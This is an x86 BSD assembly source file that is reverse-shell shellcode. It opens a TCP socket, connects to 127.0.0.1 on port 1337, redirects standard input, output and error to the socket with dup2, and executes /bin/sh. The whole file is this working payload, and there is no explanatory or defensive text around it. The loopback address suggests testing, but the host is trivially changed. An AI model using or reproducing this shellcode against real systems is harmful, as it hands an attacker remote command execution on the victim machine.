;/*
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Syscalls nums, on /usr/src/sys/kern/syscalls.master ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

%define IPPROTO_TCP 6
%define SOCK_STREAM 1
%define AF_INET 2

%define SYS_EXECV 59
%define SYS_DUP2 90
%define SYS_SOCKET 97
%define SYS_CONNECT 98

section .text

global _start

_start:
   xor eax, eax
   ;;;;;;;;;;;;;;;;;;;;;;
   ; socket()
   ;;;;;;;;;;;;;;;;;;;;;;
   push eax
   push byte SOCK_STREAM
   push byte AF_INET

   mov al, SYS_SOCKET
   push eax
   int 0x80
   mov edx, eax

   ;;;;;;;;;;;;;;;;;;;;;;
   ; sockaddr_in
   ;;;;;;;;;;;;;;;;;;;;;;
   push 0x0100007f
   push word 0x3905
   push word 0x0201
   mov ecx, esp

   ;;;;;;;;;;;;;;;;;;;;;
   ; connect()
   ;;;;;;;;;;;;;;;;;;;;;
   push byte 16
   push ecx
   push edx
   xor eax, eax
   mov al, SYS_CONNECT
   push eax
   int 0x80

   ;;;;;;;;;;;;;;;;;;;;;
   ; dup2()
   ;;;;;;;;;;;;;;;;;;;;;
   xor ecx, ecx
.L:
   push ecx
   push edx
   xor eax, eax
   mov al, SYS_DUP2
   push eax
   int 0x80

   inc cl
   cmp cl, 3
   jne .L

   ;;;;;;;;;;;;;;;;;;;;;;
   ; execv("/bin/sh")
   ;;;;;;;;;;;;;;;;;;;;;;
   xor eax, eax

   push eax

   push '//sh'
   push '/bin'

   mov ebx, esp

   push eax
   push esp
   push ebx
   mov al, SYS_EXECV
   push eax
   int 0x80
 ;*/
